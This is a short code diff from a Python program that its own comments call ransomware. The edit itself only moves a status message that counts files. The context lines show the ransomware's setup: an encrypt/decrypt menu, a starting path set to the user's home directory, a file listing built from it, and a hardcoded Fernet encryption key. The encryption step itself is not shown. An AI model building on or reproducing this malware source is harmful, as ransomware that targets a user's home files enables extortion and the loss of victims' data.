@@ -22,6 +22,7 @@ def showMenu():
     print('\t2)Decrypt files')
     return(int(input('Option: ')))
 
+print('Calculating number of files..')
 #Configure starting path of the ransomware
 path = Path(Path.home()).absolute()
 foldername = path
@@ -29,7 +30,6 @@ files = getFiles(foldername)
 #Cryptography key
 fernet = Fernet('bjq5lagsjEDIvxmWM6badVWEFD4wSGVatHaSCoYZqeI=')
 
-print('Calculating number of files..')
 size = len(files)
 print(f'Number of files: {size}\n')
 
